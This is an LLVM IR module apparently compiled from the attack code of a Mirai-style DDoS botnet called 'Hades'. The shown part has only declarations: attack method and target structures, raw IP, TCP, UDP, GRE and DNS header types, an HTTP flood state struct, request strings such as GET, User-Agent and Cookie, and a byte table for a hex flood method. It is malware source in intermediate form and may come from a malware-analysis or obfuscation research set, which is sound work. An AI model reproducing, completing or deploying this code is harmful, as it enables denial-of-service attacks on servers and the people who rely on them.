; ModuleID = 'host/ir_fla/Hades.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.attack_method = type { void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, i8 }
%struct.attack_target = type { %struct.sockaddr_in, i32, i8 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.attack_option = type { i8*, i8 }
%struct.attack_http_state = type { i32, i8, i32, i32, i32, [512 x i8], [257 x i8], [129 x i8], [513 x i8], [9 x i8], [9 x i8], i32, i32, i32, i32, i32, [5 x [128 x i8]], i32, [1024 x i8] }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%union.__CONST_SOCKADDR_ARG = type { %struct.sockaddr* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.udphdr = type { i16, i16, i16, i16 }
%struct.grehdr = type { i16, i16 }
%struct.ethhdr = type { [6 x i8], [6 x i8], i16 }
%struct.dnshdr = type { i16, i16, i16, i16, i16, i16 }

@methods_len = global i8 0, align 1
@methods = global %struct.attack_method** null, align 8
@attack_ongoing = global [15 x i32] [i32 3, i32 0, i32 0, i32 0, i32 0, i32 0, i32 0, i32 0, i32 0, i32 0, i32 0, i32 0, i32 0, i32 0, i32 0], align 16
@LOCAL_ADDR = common global i32 0, align 4
@.str = private unnamed_addr constant [4 x i8] c"GET\00", align 1
@.str.1 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.2 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.3 = private unnamed_addr constant [24 x i8] c" HTTP/1.1\0D\0AUser-Agent: \00", align 1
@.str.4 = private unnamed_addr constant [9 x i8] c"\0D\0AHost: \00", align 1
@.str.5 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.6 = private unnamed_addr constant [9 x i8] c"Cookie: \00", align 1
@.str.7 = private unnamed_addr constant [3 x i8] c"; \00", align 1
@.str.8 = private unnamed_addr constant [5 x i8] c"\0D\0A\0D\0A\00", align 1
@.str.9 = private unnamed_addr constant [2 x i8] c";\00", align 1
@.str.10 = private unnamed_addr constant [5 x i8] c"http\00", align 1
@.str.11 = private unnamed_addr constant [5 x i8] c"url=\00", align 1
@.str.12 = private unnamed_addr constant [5 x i8] c"POST\00", align 1
@.str.13 = private unnamed_addr constant [2 x i8] c"'\00", align 1
@.str.14 = private unnamed_addr constant [2 x i8] c"=\00", align 1
@attack_method_stdhex.satuur_thicc = private unnamed_addr constant [256 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1.16, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2.17, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.3.18, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4.19, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5.20, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.6.21, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.7.22, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.8.23, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9.24, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.10.25, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.11.26, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.12.27, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13.28, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.14.29, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.15.30, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.56, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.59, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.61, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.72, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.73, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.74, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.75, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.77, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.78, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.79, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.80, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.81, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.82, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.83, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.87, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.88, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.90, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.92, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.93, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.94, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.95, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.96, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.98, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.99, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.100, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.101, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.102, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.103, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.104, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.105, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.106, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.107, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.108, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.110, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.111, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.112, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.113, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.114, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.115, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.116, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.117, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.118, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.119, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.120, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.121, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.122, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.123, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.124, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.125, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.126, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.127, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.128, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.129, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.130, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.131, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.132, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.133, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.134, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.135, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.136, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.137, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.138, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.139, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.140, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.141, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.142, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.143, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.144, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.145, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.146, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.147, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.148, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.149, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.150, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.151, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.152, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.153, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.154, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.155, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.156, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.157, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.158, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.159, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.160, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.161, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.163, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.164, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.165, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.166, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.167, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.168, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.169, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.170, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.171, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.172, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.173, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.174, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.175, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.176, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.177, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.178, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.179, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.180, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.181, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.182, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.184, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.185, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.186, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.187, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.188, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.189, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.192, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.193, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.194, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.195, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.196, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.197, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.198, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.199, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.200, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.201, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.202, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.203, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.204, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.205, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.206, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.207, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.208, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.209, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.210, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.211, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.212, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.213, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.214, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.215, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.216, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.217, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.218, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.219, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.220, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.221, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.222, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.223, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.224, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.225, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.226, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.227, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.228, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.229, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.230, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.231, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.232, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.233, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.234, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.235, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.236, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.237, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.238, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.239, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.240, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.241, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.242, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.243, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.244, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.245, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.246, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.247, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.248, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.249, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.250, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.251, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.252, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.253, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.254, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.255, i32 0, i32 0)], align 16
@.str.15 = private unnamed_addr constant [2 x i8] zeroinitializer, align 1
@.str.1.16 = private unnamed_addr constant [2 x i8] c"\01\00", align 1
@.str.2.17 = private unnamed_addr constant [2 x i8] c"\02\00", align 1
@.str.3.18 = private unnamed_addr constant [2 x i8] c"\03\00", align 1
@.str.4.19 = private unnamed_addr constant [2 x i8] c"\04\00", align 1
@.str.5.20 = private unnamed_addr constant [2 x i8] c"\05\00", align 1
@.str.6.21 = private unnamed_addr constant [2 x i8] c"\06\00", align 1
@.str.7.22 = private unnamed_addr constant [2 x i8] c"\07\00", align 1
@.str.8.23 = private unnamed_addr constant [2 x i8] c"\08\00", align 1
@.str.9.24 = private unnamed_addr constant [2 x i8] c"\09\00", align 1
@.str.10.25 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@.str.11.26 = private unnamed_addr constant [2 x i8] c"\0B\00", align 1
@.str.12.27 = private unnamed_addr constant [2 x i8] c"\0C\00", align 1
@.str.13.28 = private unnamed_addr constant [2 x i8] c"\0D\00", align 1
@.str.14.29 = private unnamed_addr constant [2 x i8] c"\0E\00", align 1
@.str.15.30 = private unnamed_addr constant [2 x i8] c"\0F\00", align 1
@.str.16 = private unnamed_addr constant [2 x i8] c"\10\00", align 1
@.str.17 = private unnamed_addr constant [2 x i8] c"\11\00", align 1
@.str.18 = private unnamed_addr constant [2 x i8] c"\12\00", align 1
@.str.19 = private unnamed_addr constant [2 x i8] c"\13\00", align 1
@.str.20 = private unnamed_addr constant [2 x i8] c"\14\00", align 1
@.str.21 = private unnamed_addr constant [2 x i8] c"\15\00", align 1
@.str.22 = private unnamed_addr constant [2 x i8] c"\16\00", align 1
@.str.23 = private unnamed_addr constant [2 x i8] c"\17\00", align 1
@.str.24 = private unnamed_addr constant [2 x i8] c"\18\00", align 1
@.str.25 = private unnamed_addr constant [2 x i8] c"\19\00", align 1
@.str.26 = private unnamed_addr constant [2 x i8] c"\1A\00", align 1
@.str.27 = private unnamed_addr constant [2 x i8] c"\1B\00", align 1
@.str.28 = private unnamed_addr constant [2 x i8] c"\1C\00", align 1
@.str.29 = private unnamed_addr constant [2 x i8] c"\1D\00", align 1
@.str.30 = private unnamed_addr constant [2 x i8] c"\1E\00", align 1
@.str.31 = private unnamed_addr constant [2 x i8] c"\1F\00", align 1
@.str.32 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.33 = private unnamed_addr constant [2 x i8] c"!\00", align 1
@.str.34 = private unnamed_addr constant [2 x i8] c"\22\00", align 1
@.str.35 = private unnamed_addr constant [2 x i8] c"#\00", align 1
@.str.36 = private unnamed_addr constant [2 x i8] c"$\00", align 1
@.str.37 = private unnamed_addr constant [2 x i8] c"%\00", align 1
@.str.38 = private unnamed_addr constant [2 x i8] c"&\00", align 1
@.str.39 = private unnamed_addr constant [2 x i8] c"'\00", align 1
@.str.40 = private unnamed_addr constant [2 x i8] c"(\00", align 1
@.str.41 = private unnamed_addr constant [2 x i8] c")\00", align 1
@.str.42 = private unnamed_addr constant [2 x i8] c"*\00", align 1
@.str.43 = private unnamed_addr constant [2 x i8] c"+\00", align 1
@.str.44 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.45 = private unnamed_addr constant [2 x i8] c"-\00", align 1
@.str.46 = private unnamed_addr constant [2 x i8] c".\00", align 1
@.str.47 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.48 = private unnamed_addr constant [2 x i8] c"0\00", align 1
@.str.49 = private unnamed_addr constant [2 x i8] c"1\00", align 1
@.str.50 = private unnamed_addr constant [2 x i8] c"2\00", align 1
@.str.51 = private unnamed_addr constant [2 x i8] c"3\00", align 1
@.str.52 = private unnamed_addr constant [2 x i8] c"4\00", align 1
@.str.53 = private unnamed_addr constant [2 x i8] c"5\00", align 1
@.str.54 = private unnamed_addr constant [2 x i8] c"6\00", align 1
@.str.55 = private unnamed_addr constant [2 x i8] c"7\00", align 1
@.str.56 = private unnamed_addr constant [2 x i8] c"8\00", align 1
@.str.57 = private unnamed_addr constant [2 x i8] c"9\00", align 1
@.str.58 = private unnamed_addr constant [2 x i8] c":\00", align 1
@.str.59 = private unnamed_addr constant [2 x i8] c";\00", align 1
@.str.60 = private unnamed_addr constant [2 x i8] c"<\00", align 1
@.str.61 = private unnamed_addr constant [2 x i8] c"=\00", align 1
@.str.62 = private unnamed_addr constant [2 x i8] c">\00", align 1
@.str.63 = private unnamed_addr constant [2 x i8] c"?\00", align 1
@.str.64 = private unnamed_addr constant [2 x i8] c"@\00", align 1
